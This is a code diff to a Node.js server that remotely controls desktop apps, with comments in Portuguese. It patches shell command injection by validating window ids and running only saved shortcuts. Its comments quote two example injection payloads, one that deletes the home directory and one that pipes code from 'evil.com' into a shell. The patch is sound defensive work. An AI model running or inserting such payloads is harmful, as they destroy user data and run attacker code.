@@ -6,6 +6,17 @@ const { exec, spawn } = require('child_process');
 const cors = require('cors');
 const QRCode = require('qrcode');
 
+// Valida o "id" de uma janela antes de colar ele dentro de um comando de
+// shell (xdotool/osascript/powershell) — sem isso, um id malicioso vindo da
+// URL poderia injetar comandos extras (ex: GET /fechar/0x1;rm -rf ~). O
+// formato esperado depende do SO: no Linux é o id hexadecimal do wmctrl, no
+// Windows é o PID (só números), no macOS é o nome do processo.
+function idJanelaValido(id, plataforma) {
+    if (plataforma === 'linux') return /^0x[0-9a-fA-F]+$/.test(id);
+    if (plataforma === 'win32') return /^\d+$/.test(id);
+    return /^[\p{L}\p{N} ._-]+$/u.test(id); // darwin: nome do processo
+}
+
 const app = express();
 // CORS permite que o celular acesse o servidor sem bloqueios de segurança do navegador
 app.use(cors());
@@ -347,19 +358,23 @@ function comandoParaExecutar(comando, plataforma) {
     return `xdg-open "${url}"`;
 }
 
-// Rota dinâmica: recebe um atalho semântico (ex: "navegador", "editor") e
-// dispara o comando equivalente no sistema operacional atual.
+// Rota dinâmica: recebe o id de um atalho salvo (ex: "navegador", "editor")
+// e dispara o comando mapeado pra esse atalho no sistema operacional atual.
 app.get('/launch/:appName', (req, res) => {
     const appName = req.params.appName;
     const plataforma = process.platform; // 'win32' | 'darwin' | 'linux'
 
-    // Se for um atalho conhecido em atalhos.json, usa o comando mapeado pra
-    // essa plataforma. Se não for (ex: um app clicado na aba "Recentes",
-    // identificado pelo nome/título da janela), executa o valor recebido
-    // direto, como antes.
+    // Só executa comandos de atalhos que já existem em atalhos.json — nunca
+    // texto cru vindo da URL, que permitiria injetar qualquer comando no
+    // sistema (ex: GET /launch/calc;curl%20evil.com|sh).
     const atalhos = carregarAtalhos();
     const atalho = atalhos.find(a => a.id === appName);
-    const comando = comandoParaExecutar((atalho && atalho.comando[plataforma]) || appName, plataforma);
+
+    if (!atalho || !atalho.comando[plataforma]) {
+        return res.status(404).json({ status: 'erro', error: 'Atalho não encontrado.' });
+    }
+
+    const comando = comandoParaExecutar(atalho.comando[plataforma], plataforma);
 
     // Usamos 'spawn' (não 'exec') porque 'exec' só chama o callback quando o
     // processo TERMINA. Para apps de interface gráfica que ficam abertos
@@ -453,6 +468,10 @@ app.get('/fechar/:id', (req, res) => {
     const { id } = req.params;
     const plataforma = process.platform;
 
+    if (!idJanelaValido(id, plataforma)) {
+        return res.status(400).json({ status: 'erro', error: 'Id de janela inválido.' });
+    }
+
     let script;
     if (plataforma === 'darwin') {
         script = `osascript -e 'tell application "${id}" to quit'`;
@@ -480,6 +499,10 @@ app.get('/fechar/:id', (req, res) => {
 app.get('/minimizar/:id', (req, res) => {
     const { id } = req.params;
     const plataforma = process.platform;
+
+    if (!idJanelaValido(id, plataforma)) {
+        return res.status(400).json({ status: 'erro', error: 'Id de janela inválido.' });
+    }
 
     let script;
     if (plataforma === 'darwin') {
@@ -515,6 +538,10 @@ app.get('/minimizar/:id', (req, res) => {
 app.get('/ativar/:id', (req, res) => {
     const { id } = req.params;
     const plataforma = process.platform;
+
+    if (!idJanelaValido(id, plataforma)) {
+        return res.status(400).json({ status: 'erro', error: 'Id de janela inválido.' });
+    }
 
     let script;
     if (plataforma === 'darwin') {
